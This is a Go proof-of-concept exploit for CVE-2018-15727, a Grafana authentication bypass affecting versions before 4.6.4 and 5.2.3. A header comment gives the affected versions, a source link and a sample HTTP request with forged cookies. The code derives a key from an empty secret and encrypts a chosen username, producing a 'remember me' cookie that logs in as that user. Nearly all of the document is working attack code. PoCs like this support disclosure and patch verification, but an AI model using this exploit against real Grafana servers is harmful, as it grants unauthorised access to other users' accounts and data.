//
// CVE-2018-15727 poc 
// Grafana 2.x, 3.x, and 4.x before 4.6.4 and 5.x before 5.2.3 allows authentication bypass because an 
// attacker can generate a valid "remember me" cookie knowing only a username of an LDAP or OAuth user.
// 
// Author/Paper:
// https://lowleveldesign.org/2018/08/29/a-vulnerability-in-grafana-authentication/
// 
// -: 
//   GET /login HTTP/1.1
//   Cookie: grafana_user=some.user%40example.com; grafana_remember=key_here;
// 
//  ** set the newly received cookie and access any page as an authenticated user ** 
//
package main
 
import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "crypto/sha256"
    "encoding/hex"
    "fmt"
 
    "golang.org/x/crypto/pbkdf2"
)
 
func main() {
    secret := ""
    username := "XXXXX" // FIXME: set to username
    key := pbkdf2.Key([]byte(secret), []byte(secret), 1000, 16, sha256.New)
 
    ciphertext, err := AESGCMEncrypt(key, []byte(username))
    if err != nil {
        panic("error encrypting")
    }
 
    fmt.Println(hex.EncodeToString(ciphertext))
}
 
func AESGCMEncrypt(key, plaintext []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }
 
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
 
    nonce := make([]byte, gcm.NonceSize())
    if _, err := rand.Read(nonce); err != nil {
        return nil, err
    }
 
    ciphertext := gcm.Seal(nil, nonce, plaintext, nil)
    return append(nonce, ciphertext...), nil
}

